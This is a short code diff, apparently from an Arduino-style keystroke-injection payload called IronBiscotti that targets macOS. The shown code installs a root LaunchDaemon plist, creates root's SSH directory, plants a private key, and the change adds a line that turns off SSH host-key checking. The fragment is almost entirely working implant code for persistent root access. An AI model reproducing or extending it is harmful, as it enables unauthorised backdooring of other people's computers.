@@ -96,10 +96,15 @@ void IronBiscotti() {
   strcpy_P(buffer, com_iron_biscotti_plist);
   strcpy_P(filename, PSTR("/Library/LaunchDaemons/com.iron_biscotti.plist"));
   strcpy_P(permissions, PSTR("644"));
-  WriteToFile(filename, buffer, permissions, owner, group, 4000);
+  WriteToFile(filename, buffer, permissions, owner, group, 1000);
   //////////////////////
   strcpy_P(buffer, PSTR("mkdir -p /var/root/.ssh/"));
   EnterCommand(buffer, 0);
+  //////////////////////
+  strcpy_P(buffer, PSTR("StrictHostKeyChecking no"));
+  strcpy_P(filename, PSTR("/var/root/.ssh/config"));
+  WriteToFile(filename, buffer, permissions, owner, group, 1000);
+  //////////////////////
   strcpy_P(filename, PSTR("/var/root/.ssh/id_rsa"));
   strcpy_P(permissions, PSTR("400"));
   AddPrivateKey();
